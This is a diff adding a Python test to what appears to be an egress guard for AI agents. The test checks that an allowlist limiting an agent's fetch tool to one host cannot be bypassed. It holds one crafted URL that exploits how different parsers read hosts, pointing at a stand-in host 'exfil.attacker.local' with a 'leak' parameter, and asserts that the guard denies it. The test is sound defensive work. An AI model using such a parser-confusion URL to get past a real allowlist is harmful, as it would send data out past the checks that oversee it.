@@ -123,3 +123,19 @@ def test_demo_reset(client):
     new_trial(client)
     r = client.post("/api/v1/demo/reset").json()
     assert r["ok"] and [x["id"] for x in client.get("/api/v1/trials").json() if x["agent"]["id"] == "agt_researchbot"] == [r["demoTrialId"]]
+
+
+def test_url_parser_bypass_is_denied(client):
+    """S-1: a URL that parses to different hosts in Python vs WHATWG must not pass the Guard."""
+    t = new_trial(client)
+    pol = {"version": "decoyr.guard.v1", "agent": "x",
+           "allow": {"mcp_tools": {"net.fetch": {"hosts": ["docs.acme.local"]}}, "network": {"GET": ["docs.acme.local"], "POST": []}},
+           "deny": {"mcp_tools": [], "network": []}, "limits": {"wall_seconds": 60, "memory_mb": 512, "max_tool_calls": 40}}
+    gid = insert_guard(t["id"], pol)
+    run = make_run(t["id"], "replay", gid)
+    city = FakeCity(client, run["id"], t["id"])
+    bad = "http://exfil.attacker.local\\@docs.acme.local/x?k=leak"
+    assert city.post("/internal/policy/evaluate", {"runId": run["id"], "trialId": t["id"], "layer": "mcp", "tool": "net.fetch", "args": {"url": bad}}).json()["decision"] == "denied"
+    assert city.post("/internal/policy/evaluate", {"runId": run["id"], "trialId": t["id"], "layer": "network", "tool": "net.egress", "args": {"method": "GET", "url": bad}}).json()["decision"] == "denied"
+    # the legitimate allowlisted host still works
+    assert city.post("/internal/policy/evaluate", {"runId": run["id"], "trialId": t["id"], "layer": "network", "tool": "net.egress", "args": {"method": "GET", "url": "http://docs.acme.local/x"}}).json()["decision"] == "allowed"
